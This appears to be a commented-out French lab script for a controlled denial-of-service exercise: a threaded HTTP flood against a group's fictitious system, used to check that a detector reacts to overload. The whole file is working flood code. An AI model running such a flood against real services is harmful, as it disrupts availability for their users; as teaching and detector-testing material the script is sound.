# NE PAS UTILISER EN DEHORS DU LABORATOIRE !
# """Déni de service contrôlé — LABORATOIRE UNIQUEMENT.

# Attaque secondaire : une rafale de requêtes pendant quelques secondes contre le
# SI fictif de VOTRE groupe, pour faire monter le trafic, la latence et le CPU de
# l'API. Sert à montrer que le détecteur réagit aussi à une surcharge, pas
# seulement à une panne. Durée et intensité volontairement limitées.

# Usage :
#     python dos.py --target http://192.168.137.1:8080 --seconds 20 --workers 50
# """
# import argparse
# import threading
# import time

# import httpx


# def flood(target: str, stop: threading.Event):
#     with httpx.Client(timeout=2) as client:
#         while not stop.is_set():
#             try:
#                 client.get(f"{target}/healthz")
#             except httpx.HTTPError:
#                 pass


# def main():
#     parser = argparse.ArgumentParser(description="DoS contrôlé contre le SI fictif du groupe")
#     parser.add_argument("--target", default="http://127.0.0.1:8080")
#     parser.add_argument("--seconds", type=int, default=20)
#     parser.add_argument("--workers", type=int, default=50)
#     args = parser.parse_args()

#     print(f"Rafale vers {args.target} pendant {args.seconds}s avec {args.workers} threads…")
#     stop = threading.Event()
#     threads = [threading.Thread(target=flood, args=(args.target, stop)) for _ in range(args.workers)]
#     for thread in threads:
#         thread.start()
#     time.sleep(args.seconds)
#     stop.set()
#     for thread in threads:
#         thread.join()
#     print("Rafale terminée.")


# if __name__ == "__main__":
#     main()
